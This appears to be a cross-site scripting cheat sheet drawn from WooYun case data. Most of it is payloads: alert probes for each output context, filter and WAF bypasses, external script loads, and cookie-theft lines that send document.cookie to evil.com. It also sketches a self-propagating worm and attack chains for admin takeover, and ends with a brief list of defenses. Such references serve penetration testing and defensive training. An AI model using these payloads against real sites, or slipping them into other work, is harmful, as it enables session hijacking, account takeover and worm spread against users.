# Web Security - XSS Cross-Site Scripting

> Source: WooYun Vulnerability Database (7,532 XSS cases) | Split from web-injection.md

## II. XSS Cross-Site Scripting

### 2.1 Vulnerability Essence

```
User input (data) -> Output without encoding -> Browser parses as code -> Script executes
```

**Core Formula**: XSS = Trust boundary violation + Output context confusion (data changes semantics in HTML/JS/CSS/URL)

### 2.2 Detection Methods

#### High-Risk Output Points

| Output Point | Trigger Condition | Typical Scenario |
|---|---|---|
| Username/nickname/signature | Page load | Profile page, comments, friend list |
| Search box echo | Search action | Search results page |
| Comments/message boards | Content display | Forums, blogs, product reviews |
| File name/description | File listing | Cloud storage, photo albums |
| Email body/subject | Opening an email | Email systems |
| Order notes | Viewed in admin panel | E-commerce backend, ticketing systems |

**Hidden Output Points** (easily overlooked): HTTP headers (XFF/UA written to logs), WAP submission displayed on PC, client nickname rendered on web, drafts/review lists

#### Quick Context Identification

```
Output inside <script>?     -> JS context (check quote type)
Output inside attribute?    -> Attribute context (check attribute type)
Output inside tag content?  -> HTML context (check special tags like textarea/title)
Output inside URL?          -> URL context (check protocol restrictions)
Output inside CSS?          -> CSS context (check expression support)
```

### 2.3 Context-Specific Payloads

#### HTML Tag Content

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTML Attribute Values

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScript Strings

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL Context

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/Filter Bypass Techniques

#### Encoding Bypass

```html
<!-- HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + data protocol -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSS encoding (IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Tag/Attribute Mutation

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- Case mixing -->
<script/src=//xss.com/x.js>            <!-- Slash as space -->
<img src=x onerror=alert(1)>           <!-- No quotes -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- Double-write bypass -->
<scr\x00ipt>alert(1)</script>          <!-- Null character bypass -->
```

#### Alternative Event Handlers

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAF-Specific Bypasses

```html
.<script src=http://localhost/1.js>.    <!-- Anquanbao: add dots before and after -->
<!--[if true]><img onerror=alert(1) src=--> <!-- Comment interference -->
```

#### Length Limit Bypass

```html
<script src=//xss.pw/j>                <!-- Shortest external load -->
<!-- DOM concatenation -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- String concatenation to bypass keywords -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnly Bypass

- Use Flash interfaces to obtain user information instead of Cookie
- Switch to CSRF approach: directly perform sensitive operations (change password, add admin, read token)

### 2.5 Exploitation Chains

#### Cookie Theft

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSS - Key Sources and Sinks

**Dangerous sources**: `location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**Dangerous sinks**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSS Worm Core Logic

```javascript
// 1. Obtain current user identity (cookie/token)
// 2. Construct content containing a self-propagating payload
// 3. Auto-post/share (AJAX POST)
// 4. Trigger condition: viewing/visiting causes propagation
function worm(){
    jQuery.post("/api/post", {"content": "<self-propagating payload>"})
}
worm()
```

#### Combined Exploitation Patterns

```
XSS + CSRF -> Obtain Token to perform admin operations
XSS + SQLi -> Blind exfiltration of Cookie -> Backend injection
XSS -> Account hijacking -> Privilege escalation -> Worm propagation
Blind XSS (comments/tickets/feedback) -> Obtain admin Cookie from backend
```

### 2.6 Defense Measures

- **Output encoding** (core): HTML entities in HTML context, JS encoding in JS context, URL encoding in URL context
- CSP policy to restrict script sources
- HTTPOnly to protect cookies
- Whitelist input validation (avoid blacklists - they always have gaps)
- **Common mistakes**: Only filtering `<script>` tags, only filtering lowercase, client-side filtering bypassed by interception, single-pass filtering bypassed by double-write

---
